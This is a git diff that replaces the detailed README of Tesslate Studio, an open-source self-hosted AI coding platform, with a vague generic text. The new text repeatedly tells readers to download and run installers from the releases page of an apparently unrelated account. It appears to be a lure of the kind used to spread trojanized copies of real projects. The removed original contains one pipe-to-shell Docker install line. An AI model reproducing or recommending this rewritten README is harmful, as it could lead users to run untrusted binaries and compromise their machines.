@@ -1,604 +1,74 @@
-<div align="center">
+# 🎨 Studio - A Friendly Solution for Local Projects
 
-<img src="images/Banner.png" alt="Tesslate Studio Banner" width="100%">
+[![Download Studio](https://img.shields.io/badge/Download-Studio-brightgreen)](https://github.com/Misfiresatisfaction927/Studio/releases)
 
-# Tesslate Studio
+## 🚀 Getting Started
 
-**The Open-Source AI Development Platform Built for Self-Hosting**
+Welcome to Studio! This open-source application provides a friendly environment for local project development with full stack support. You can easily manage, run, and deploy your applications—all from your own computer.
 
-AI-powered development environment with advanced agent orchestration - designed for complete data sovereignty and infrastructure control.
+### 🖥️ System Requirements
 
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?logo=docker&logoColor=white)](https://www.docker.com/)
-[![React](https://img.shields.io/badge/React-19-61DAFB?logo=react&logoColor=black)](https://react.dev/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-Backend-009688?logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com/)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-Ready-4169E1?logo=postgresql&logoColor=white)](https://www.postgresql.org/)
+To get the best experience with Studio, your system should meet the following requirements:
 
-[Quick Start](#quick-start) · [Features](#key-features) · [Documentation](https://docs.tesslate.com) · [Contributing](#contributing)
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- **RAM**: At least 4 GB of RAM.
+- **Storage**: Minimum of 200 MB free disk space for installation.
+- **Internet Access**: Required for downloading Studio and accessing support resources.
 
-**Includes support for llama.cpp, LM Studio, Ollama, Openrouter, and any provider you choose.**
+## 📥 Download & Install
 
-</div>
+You can download Studio from the Releases page. Follow these steps to get started:
 
----
+1. **Visit the Releases Page:** Click the link below to go to our Releases page.
 
-<div align="center">
+   [Download Studio](https://github.com/Misfiresatisfaction927/Studio/releases)
 
-<img src="images/screenshot.png" alt="Tesslate Studio Screenshot" width="100%">
+2. **Choose a Version:** On the Releases page, you will see a list of available versions. Look for the latest release, as it will have the most features and bug fixes.
 
-</div>
+3. **Download the Installer:** Click on the link to download the appropriate version for your operating system. You will get an installer file, usually ending in `.exe` for Windows, `.dmg` for macOS, or a package file for Linux distributions.
 
----
+4. **Run the Installer:** Once the download is complete, locate the downloaded file in your computer's download folder:
 
-<table>
-<tr>
-<td width="50%" valign="top">
+   - **Windows:** Double-click the `.exe` file.
+   - **macOS:** Double-click the `.dmg` file and drag the Studio icon to your Applications folder.
+   - **Linux:** Open the terminal and run the package manager command to install the downloaded package.
 
-<div align="center">
+5. **Follow the Setup Instructions:** A simple setup wizard will guide you through the installation process. Just follow the prompts.
 
-### TL;DR? Get an AI Summary
+6. **Launch Studio:** After installation is complete, find the Studio application in your programs or applications list and open it.
 
-**Click to auto-load the summary:**
+## 🔍 Exploring Studio
 
-[![ChatGPT](https://img.shields.io/badge/Ask-ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white)](https://chatgpt.com/?q=Summarize%20https%3A%2F%2Fgithub.com%2FTesslateAI%2FStudio)
+Once you open Studio, take a moment to familiarize yourself with the interface:
 
-[![Claude](https://img.shields.io/badge/Ask-Claude-191919?style=for-the-badge&logo=anthropic&logoColor=d4a574)](https://claude.ai/new?q=Summarize%20https%3A%2F%2Fgithub.com%2FTesslateAI%2FStudio)
+- **Dashboard:** The main screen will display your projects and recent activities. You can create a new project or open an existing one.
+- **Tools Menu:** Access various development tools for building and testing your application directly from the menu.
+- **Support:** For help, refer to the documentation available within the application or on our GitHub page.
 
-[![Gemini](https://img.shields.io/badge/Ask-Gemini-8E75B2?style=for-the-badge&logo=google&logoColor=white)](https://www.google.com/search?udm=50&q=Summarize+https://github.com/TesslateAI/Studio)
+## 💡 Features
 
-[![Perplexity](https://img.shields.io/badge/Ask-Perplexity-20808d?style=for-the-badge&logo=perplexity&logoColor=white)](https://www.perplexity.ai/?q=Summarize%20https://github.com/TesslateAI/Studio)
+Studio comes packed with essential features to help you in your development tasks:
 
-<sub>Links open with the prompt pre-loaded</sub>
+- **User-Friendly Interface:** Designed with simplicity in mind, making it easy for everyone to use.
+- **Full Stack Support:** Build both front-end and back-end applications without the need for additional tools.
+- **Local Hosting:** Run your projects on your computer, providing full control and privacy.
+- **Collaboration Tools:** Share your work easily with teammates or friends.
+- **Integrated Help System:** Get instant help and resources when you need assistance.
 
-</div>
+## 📢 Community & Support
 
-</td>
-<td width="50%" valign="top">
+Join the Studio community to connect with other users. You can share ideas, ask questions, and find helpful tips. For more extensive support, check our GitHub Discussions or the Issues section if you encounter any problems. 
 
-<div align="center">
+Your feedback is vital for improving Studio! We welcome suggestions and contributions. 
 
-### Community & Resources
+## 🔗 Additional Resources
 
-[![Discord](https://img.shields.io/badge/Discord-Join%20Community-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/YOUR_DISCORD_INVITE)
-[![Website](https://img.shields.io/badge/Website-tesslate.com-FF6B6B?style=for-the-badge&logo=google-chrome&logoColor=white)](https://tesslate.com)
-[![Hugging Face](https://img.shields.io/badge/%F0%9F%A4%97-Models-FFD21E?style=for-the-badge)](https://huggingface.co/Tesslate)
+- **User Documentation:** Detailed manuals to help you navigate and utilize all features.
+- **Community Forum:** Discuss ideas, report bugs, and collaborate with other users.
+- **Contribution Guide:** Instructions for those who wish to contribute to Studio development.
 
-[![Twitter](https://img.shields.io/badge/Twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/TesslateAI)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/company/tesslate-ai)
-[![YouTube](https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://youtube.com/@TesslateAI)
-[![Instagram](https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://instagram.com/tesslateai)
+Thank you for choosing Studio! We hope this application makes your development tasks easier and more enjoyable. 
 
-**Email:** [team@tesslate.com](mailto:team@tesslate.com)
+For downloads and updates, remember to check the link below for the latest versions.
 
-</div>
-
-</td>
-</tr>
-</table>
-
----
-
-
-## What Makes Tesslate Studio Different?
-
-**Infrastructure-first AI development platform designed for complete ownership and control.**
-
-Tesslate Studio isn't just another code generation tool - it's a complete development platform architected from the ground up for self-hosting and data sovereignty:
-
-### Self-Hosted Architecture
-- **Run anywhere**: Your machine, your cloud, your datacenter
-- **Container isolation**: Each project runs in its own sandboxed Docker container
-- **Subdomain routing**: Clean URLs (`project.studio.localhost`) for easy project access
-- **Data sovereignty**: Your code never leaves your infrastructure
-
-### Advanced Multi-Agent System
-- **Iterative Agents**: Autonomous "think-act-reflect" loops that debug, research, and iterate independently
-- **Tool Registry**: File operations (read/write/patch), persistent shell sessions, web fetch, planning tools
-- **Command Validation**: Security sandboxing with allowlists, blocklists, and injection protection
-- (Coming soon) **Multi-agent orchestration**: Built on TframeX framework - agents collaborate across frontend, backend, database concerns
-- (Coming soon) **Model Context Protocol (MCP)**: Inter-agent communication for complex task coordination
-
-### Enterprise-Grade Security
-- **JWT authentication** with refresh token rotation and revocable sessions
-- **Encrypted credential storage** using Fernet encryption for API keys and tokens
-- **Audit logging**: Complete command history for compliance
-- **Container isolation**: Projects run in isolated environments
-- **Command sanitization**: AI-generated shell commands validated before execution
-
-### Full Development Lifecycle
-- **Kanban project management**: Built-in task tracking with priorities, assignees, and comments
-- **Architecture visualization**: AI-generated Mermaid diagrams of your codebase
-- **Git integration**: Full version control with commit history, branching, and GitHub push/pull
-- **Agent marketplace**: Pluggable architecture - fork agents, swap models, customize prompts
-- **Database integration**: PostgreSQL with migration scripts and schema management
-
-### Extensibility & Customization
-- **Tesslate Forge**: Train, fine-tune, and deploy custom models as agents
-- **Open source agents**: All 10 marketplace agents are forkable and modifiable
-- **Model flexibility**: OpenAI, Anthropic, Google, local LLMs via Ollama/LM Studio
-- **Platform customization**: Fork the entire platform for proprietary workflows
-
-**Built for:**
-- **Developers** who want complete control over their AI development environment
-- **Teams** needing data privacy and on-premises deployment
-- **Regulated industries** (healthcare, finance, government) requiring data sovereignty
-- **Organizations** building AI-powered internal tools
-- **Engineers** wanting to customize the platform itself
-
----
-
-## Quick Start
-
-**Get running in 3 steps, 3 minutes:**
-
-```bash
-# 1. Clone and configure
-git clone https://github.com/TesslateAI/Studio.git
-cd Studio
-cp .env.example .env
-
-# 2. Add your API keys (OpenAI, Anthropic, etc.) to .env
-# Edit .env: Set SECRET_KEY and LITELLM_MASTER_KEY
-
-# 3. Start everything
-docker compose up -d
-```
-
-**That's it!** Open http://studio.localhost
-
-**What's included:**
-- 10 AI agents ready to use
-- 3 project templates pre-loaded
-- Live preview with hot reload
-- Authentication system ready
-
-<details>
-<summary><b>First time with Docker? Click here for help</b></summary>
-
-**Install Docker:**
-- **Windows/Mac**: [Docker Desktop](https://www.docker.com/products/docker-desktop/)
-- **Linux**: `curl -fsSL https://get.docker.com | sh`
-
-**Generate secure keys:**
-```bash
-# SECRET_KEY
-python -c "import secrets; print(secrets.token_urlsafe(32))"
-
-# LITELLM_MASTER_KEY
-python -c "import secrets; print('sk-' + secrets.token_urlsafe(32))"
-```
-
-</details>
-
----
-
-## Key Features
-
-### AI-Powered Code Generation
-Natural language to full-stack applications. Describe what you want, watch it build in real-time with streaming responses.
-
-### Live Preview with Real URLs
-Every project gets its own subdomain (`your-app.studio.localhost`) with hot module replacement. See changes instantly as AI writes code.
-
-### Customizable AI Agents Marketplace
-10 pre-built, open-source agents: Stream Builder, Full Stack Agent, Code Analyzer, Test Generator, API Designer, and more. Fork them, swap models (GPT-5, Claude, local LLMs), edit prompts - it's your code.
-
-### Project Templates
-Start fast with ready templates:
-- Next.js 15 (App Router, SSR, API routes)
-- Vite + React + FastAPI (Python backend)
-- Vite + React + Go (high-performance backend)
-
-### Docker-Based Architecture
-- **One command deployment**: `docker compose up -d`
-- **Container per project**: Isolated development environments
-- **PostgreSQL** for persistent data
-- **Traefik** ingress with subdomain routing
-- **JWT authentication**, audit logging, secrets management
-
-### Monaco Code Editor
-Full VSCode-like editing experience in the browser. Syntax highlighting, IntelliSense, multi-file editing.
-
-### Privacy & Security First
-Your code never leaves your infrastructure. GitHub OAuth, encrypted secrets, comprehensive audit logs, role-based access control.
-
----
-
-## The Story
-
-**Why we built this:**
-
-We needed an AI development platform that could run on our own infrastructure without sacrificing data sovereignty or architectural control. Every existing solution required choosing between convenience and control - cloud platforms were fast but locked us in, while local tools lacked the sophistication we needed.
-
-So we built Tesslate Studio as infrastructure-first: Docker for simple deployment, container isolation for project sandboxing, and enterprise security built-in. It's designed for developers and organizations that need the power of AI-assisted development while maintaining complete ownership of their code and data.
-
-**The name "Tesslate"** comes from tessellation - the mathematical concept of tiles fitting together perfectly without gaps. That's our architecture: AI agents, human developers, isolated environments, and scalable infrastructure working together seamlessly.
-
-**Open source from the start:** We believe critical development infrastructure should be transparent, auditable, and owned by the teams using it - not controlled by vendors who can change terms overnight.
-
----
-
-## Architecture
-
-Tesslate Studio creates **isolated containerized environments** for each project:
-
-```
-┌─────────────────────────────────────────────────────┐
-│  Your Machine / Your Cloud / Your Datacenter       │
-├─────────────────────────────────────────────────────┤
-│                                                     │
-│  ┌──────────────────────────────────────────┐     │
-│  │  Tesslate Studio (You control this)     │     │
-│  │                                           │     │
-│  │  • FastAPI Orchestrator (Python)         │     │
-│  │  • React Frontend (TypeScript)           │     │
-│  │  • PostgreSQL Database                    │     │
-│  │  • AI Agent Marketplace                   │     │
-│  └───────────┬──────────────────────────────┘     │
-│              │                                      │
-│              ▼                                      │
-│  ┌──────────────────────────────────────────┐     │
-│  │  Project Containers (Isolated)           │     │
-│  │                                           │     │
-│  │  todo-app.studio.localhost               │     │
-│  │  dashboard.studio.localhost              │     │
-│  │  prototype.studio.localhost              │     │
-│  └──────────────────────────────────────────┘     │
-│                                                     │
-│  ┌──────────────────────────────────────────┐     │
-│  │  Your AI Models (You choose)             │     │
-│  │                                           │     │
-│  │  • OpenAI GPT-5 (API)                    │     │
-│  │  • Anthropic Claude (API)                │     │
-│  │  • Local LLMs via Ollama                 │     │
-│  │  • Or any LiteLLM-compatible provider    │     │
-│  └──────────────────────────────────────────┘     │
-└─────────────────────────────────────────────────────┘
-```
-
-**Key Architecture Principles:**
-1. **Container-per-project** - True isolation, no conflicts
-2. **Subdomain routing** - Clean URLs, easy project access
-3. **Bring your own models** - No vendor lock-in for AI
-4. **Self-hosted** - Complete infrastructure control
-
----
-
-## Getting Started
-
-### Prerequisites
-
-- **Docker Desktop** (Windows/Mac) or **Docker Engine** (Linux)
-- **8GB RAM minimum** (16GB recommended)
-- **OpenAI or Anthropic API key** (or run local LLMs with Ollama)
-
-### Installation
-
-**Step 1: Clone the repository**
-
-```bash
-git clone https://github.com/TesslateAI/Studio.git
-cd Studio
-```
-
-**Step 2: Configure environment**
-
-```bash
-cp .env.example .env
-```
-
-Edit `.env` and set these required values:
-
-```env
-# Generate with: python -c "import secrets; print(secrets.token_urlsafe(32))"
-SECRET_KEY=your-generated-secret-key
-
-# Your LiteLLM master key
-LITELLM_MASTER_KEY=sk-your-litellm-key
-
-# AI provider API keys (at least one required)
-OPENAI_API_KEY=sk-your-openai-key
-ANTHROPIC_API_KEY=sk-your-anthropic-key
-```
-
-**Step 3: Start Tesslate Studio**
-
-```bash
-docker compose up -d
-```
-
-**Step 4: Create your account**
-
-Open http://studio.localhost and sign up. The first user becomes admin automatically.
-
-**Step 5: Start building**
-
-1. Click "New Project" → Choose a template
-2. Describe what you want in natural language
-3. Watch AI generate your app in real-time
-4. Open live preview at `{your-project}.studio.localhost`
-
-### Development Modes
-
-**Full Docker** (Recommended for most users)
-```bash
-docker compose up -d
-```
-Everything runs in containers. One command, fully isolated.
-
-**Hybrid Mode** (Fastest for active development)
-```bash
-# Start infrastructure
-docker compose up -d traefik postgres
-
-# Run services natively (separate terminals)
-cd orchestrator && uv run uvicorn app.main:app --reload
-cd app && npm run dev
-```
-Native services for instant hot reload, Docker for infrastructure.
-
----
-
-## Configuration
-
-### AI Models
-
-Tesslate uses [LiteLLM](https://github.com/BerriAI/litellm) as a unified gateway. This means you can use:
-
-- **OpenAI** (GPT-5, GPT-4, GPT-3.5)
-- **Anthropic** (Claude 3.5, Claude 3)
-- **Google** (Gemini Pro)
-- **Local LLMs** (Ollama, LocalAI)
-- **100+ other providers**
-
-Configure in `.env`:
-
-```env
-# Default models
-LITELLM_DEFAULT_MODELS=gpt-5o-mini,claude-3-haiku,gemini-pro
-
-# Per-user budget (USD)
-LITELLM_INITIAL_BUDGET=10.0
-```
-
-### Database
-
-**Development:** PostgreSQL runs in Docker automatically.
-
-**Production:** Use a managed database:
-```env
-DATABASE_URL=postgresql+asyncpg://user:pass@your-postgres:5432/tesslate
-```
-
-### Domain Configuration
-
-**Local development:**
-```env
-APP_DOMAIN=studio.localhost
-```
-
-**Production:**
-```env
-APP_DOMAIN=studio.yourcompany.com
-APP_PROTOCOL=https
-```
-
-Projects will be accessible at `{project}.studio.yourcompany.com`
-
----
-
-## Contributing
-
-We'd love your help making Tesslate Studio better!
-
-### Quick Contribution Guide
-
-1. **Fork the repo** and clone your fork
-2. **Create a branch**: `git checkout -b feature/amazing-feature`
-3. **Make your changes** and test locally
-4. **Commit**: `git commit -m 'Add amazing feature'`
-5. **Push**: `git push origin feature/amazing-feature`
-6. **Open a Pull Request** with a clear description
-
-### Good First Issues
-
-New to the project? Check out issues labeled [`good first issue`](https://github.com/TesslateAI/Studio/labels/good%20first%20issue).
-
-### Development Setup
-
-```bash
-# Clone your fork
-git clone https://github.com/YOUR-USERNAME/Studio.git
-cd Studio
-
-# Start in hybrid mode (fastest for development)
-docker compose up -d traefik postgres
-cd orchestrator && uv run uvicorn app.main:app --reload
-cd app && npm run dev
-```
-
-### Contribution Guidelines
-
-- **Tests**: Add tests for new features
-- **Docs**: Update documentation if you change functionality
-- **Commits**: Use clear, descriptive commit messages
-- **PRs**: One feature per PR, keep them focused
-
-**Before submitting:**
-- Run tests: `npm test` (frontend), `pytest` (backend)
-- Update docs if needed
-- Test with `docker compose up -d`
-
----
-
-## Documentation
-
-Visit our complete documentation at **[docs.tesslate.com](https://docs.tesslate.com)**
-
-### Self-Hosting Guides
-- **[Self-Hosting Quickstart](https://docs.tesslate.com/self-hosting/quickstart)** - Get running in 5 minutes
-- **[Configuration Guide](https://docs.tesslate.com/self-hosting/configuration)** - All environment variables explained
-- **[Production Deployment](https://docs.tesslate.com/self-hosting/deployment)** - Deploy with custom domains and SSL
-- **[Architecture Overview](https://docs.tesslate.com/self-hosting/architecture)** - How everything works under the hood
-
-### Development Guides
-- **[Development Setup](https://docs.tesslate.com/development/guide)** - Contributor and developer guide
-- **[API Documentation](https://docs.tesslate.com/api-reference/introduction)** - Backend API reference
-
-### Using Tesslate Studio
-- **[Getting Started](https://docs.tesslate.com/quickstart)** - Cloud version quickstart
-- **[Working with Projects](https://docs.tesslate.com/guides/creating-projects)** - Create and manage projects
-- **[AI Agents Guide](https://docs.tesslate.com/guides/agents)** - Understanding and using AI agents
-- **[FAQ](https://docs.tesslate.com/faq)** - Frequently asked questions
-
----
-
-## Security
-
-We take security seriously. Found a vulnerability?
-
-**Please DO NOT open a public issue.** Instead:
-
-**Email us:** security@tesslate.com
-
-We'll respond within 24 hours and work with you to address it.
-
-### Security Features
-
-- **JWT authentication** with refresh tokens
-- **Encrypted secrets** storage (GitHub tokens, API keys)
-- **Audit logging** (who did what, when)
-- **Role-based access** control (admin, user, viewer)
-- **Container isolation** (projects can't access each other)
-- **HTTPS/TLS** in production (automatic Let's Encrypt)
-
----
-
-## License
-
-Tesslate Studio is **Apache 2.0 licensed**. See [LICENSE](LICENSE).
-
-**What this means:**
-- **Commercial use** - Build paid products with it
-- **Modification** - Fork and customize freely
-- **Distribution** - Share your modifications
-- **Patent grant** - Protected from patent claims
-- **Trademark** - "Tesslate" name is reserved
-- **Liability** - Provided "as is" (standard for open source)
-
-### Third-Party Licenses
-
-This project uses open-source software. Full attributions in [THIRD-PARTY-NOTICES.md](THIRD-PARTY-NOTICES.md).
-
----
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=TesslateAI/Studio&type=Date)](https://star-history.com/#TesslateAI/Studio&Date)
-
----
-
-## Roadmap
-
-**Coming soon:**
-- [ ] Multi Multi Agent ;)
-- [ ] Local to Cloud Agent marketplace
-- [ ] Two Way Git Sync
-- [ ] Plugin system for custom integrations
-
-**Have an idea?** [Open a feature request](https://github.com/TesslateAI/Studio/issues/new?template=feature_request.md)
-
----
-
-## FAQ
-
-<details>
-<summary><b>Q: Do I need to pay for OpenAI/Claude API?</b></summary>
-
-**A:** You bring your own API keys. Tesslate Studio doesn't charge for AI - you pay your provider directly (usually pennies per request). You can also use free local models via Ollama.
-
-</details>
-
-<details>
-<summary><b>Q: Can I use this commercially?</b></summary>
-
-**A:** Yes! Apache 2.0 license allows commercial use. Build SaaS products, internal tools, whatever you want.
-
-</details>
-
-<details>
-<summary><b>Q: Is my code/data sent to Tesslate's servers?</b></summary>
-
-**A:** No. Tesslate Studio is self-hosted - everything runs on YOUR infrastructure. We never see your code or data.
-
-</details>
-
-<details>
-<summary><b>Q: Can I modify the AI agents?</b></summary>
-
-**A:** Absolutely! All 10 agents are open source. Fork them, edit prompts, swap models (GPT → Claude → local LLM), or create entirely new agents.
-
-</details>
-
-<details>
-<summary><b>Q: Can I run this without Docker?</b></summary>
-
-**A:** While Docker is recommended, you can run services natively. You'll need to manually set up PostgreSQL, Traefik, and configure networking.
-
-</details>
-
-<details>
-<summary><b>Q: What hardware do I need?</b></summary>
-
-**A:** Minimum 8GB RAM, 16GB recommended. Works on Windows, Mac, and Linux. An internet connection is needed for AI API calls (unless using local models).
-
-</details>
-
----
-
-## Community & Support
-
-### Get Help
-
-- **[Documentation](https://docs.tesslate.com)** - Comprehensive guides
-- **[GitHub Discussions](https://github.com/TesslateAI/Studio/discussions)** - Ask questions, share ideas
-- **[Issues](https://github.com/TesslateAI/Studio/issues)** - Report bugs, request features
-- **[Email](mailto:support@tesslate.com)** - Direct support (response within 24h)
-
-### Stay Updated
-
-- **Star this repo** to get notified of updates
-- **Watch releases** for new versions
-- **[Follow on Twitter/X](https://twitter.com/tesslate)** - News and tips
-
-### Contributing
-
-Contributions are **welcome and encouraged**! See our **[Development Guide](https://docs.tesslate.com/development/guide)** for setup instructions and contribution guidelines.
-
-**Special thanks to our contributors:**
-
-[![Contributors](https://contrib.rocks/image?repo=TesslateAI/Studio)](https://github.com/TesslateAI/Studio/graphs/contributors)
-
----
-
-## Acknowledgments
-
-Tesslate Studio wouldn't exist without these amazing open-source projects:
-
-- [FastAPI](https://fastapi.tiangolo.com/) - Modern Python web framework
-- [React](https://react.dev/) - UI library
-- [Vite](https://vitejs.dev/) - Lightning-fast build tool
-- [Monaco Editor](https://microsoft.github.io/monaco-editor/) - VSCode's editor
-- [LiteLLM](https://github.com/BerriAI/litellm) - Unified AI gateway
-- [Traefik](https://traefik.io/) - Cloud-native proxy
-- [PostgreSQL](https://www.postgresql.org/) - Reliable database
-
----
-
-<div align="center">
-
-**Built by developers who believe critical infrastructure should be open**
-
-[Star this repo](https://github.com/TesslateAI/Studio) · [Fork it](https://github.com/TesslateAI/Studio/fork) · [Share it](https://twitter.com/intent/tweet?text=Check%20out%20Tesslate%20Studio%20-%20Open%20source%20AI%20development%20platform%20for%20self-hosting!&url=https://github.com/TesslateAI/Studio)
-
-</div>
+[Download Studio](https://github.com/Misfiresatisfaction927/Studio/releases)
